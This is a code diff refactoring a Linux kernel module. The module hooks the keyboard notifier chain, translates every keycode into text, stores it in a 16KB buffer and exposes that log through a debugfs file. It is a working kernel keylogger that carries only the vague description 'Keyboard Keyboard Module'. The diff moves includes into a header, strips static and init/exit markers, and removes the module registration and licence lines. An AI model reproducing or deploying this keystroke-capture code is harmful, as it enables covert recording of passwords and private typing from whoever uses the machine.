@@ -1,20 +1,9 @@
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/moduleparam.h>
-#include <linux/keyboard.h>
-#include <linux/debugfs.h>
-#include <linux/input.h>
+#include "keyboardmodule.h"
 
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 #define CHUNK_LEN 12			 /* Encoded 'keycode shift' chunk length */
 
-/*
- * Keymap references:
- * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
- * http://www.quadibloc.com/comp/scan.htm
- */
-static const char *us_keymap[][2] = {
+char *us_keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, // 0-3
 	{"3", "#"},
 	{"4", "$"},
@@ -135,13 +124,12 @@ static const char *us_keymap[][2] = {
 };
 
 // Variables related to file handling
-static struct dentry *file;
-static struct dentry *subdir;
+struct dentry *file;
+struct dentry *subdir;
+char keybuf[BUF_LEN];
+size_t buf_pos;
 
-static char keybuf[BUF_LEN];
-static size_t buf_pos;
-
-static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset)
+ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset)
 {
 	return simple_read_from_buffer(buffer, len, offset, keybuf, buf_pos);
 }
@@ -153,12 +141,9 @@ const struct file_operations keys_fops = {
 
 // end of file related variables
 
-int keyboard_callback(struct notifier_block *nblock, long unsigned int code, void *_param);
-static int __init keyboard_module_init(void);
-static void __exit keyboard_module_exit(void);
-void keycode_to_string(int keycode, int shift_mask, char *buf);
 
-static struct notifier_block my_notifier_block = {
+
+struct notifier_block my_notifier_block = {
 	.notifier_call = keyboard_callback,
 };
 
@@ -197,7 +182,7 @@ int keyboard_callback(struct notifier_block *nblock, long unsigned int code, voi
 	return NOTIFY_OK;
 }
 
-static int __init keyboard_module_init(void)
+int keyboard_module_init(void)
 {
 
 	register_keyboard_notifier(&my_notifier_block);
@@ -219,7 +204,7 @@ static int __init keyboard_module_init(void)
 	return 0;
 }
 
-static void __exit keyboard_module_exit(void)
+void keyboard_module_exit(void)
 {
 	unregister_keyboard_notifier(&my_notifier_block);
 	debugfs_remove_recursive(subdir);
@@ -245,10 +230,3 @@ void keycode_to_string(int keycode, int shift_mask, char *buf)
 		snprintf(buf, CHUNK_LEN, "%s", us_key);
 	}
 }
-
-module_init(keyboard_module_init);
-module_exit(keyboard_module_exit);
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("NicholasEnzoRafael");
-MODULE_DESCRIPTION("Keyboard Keyboard Module");
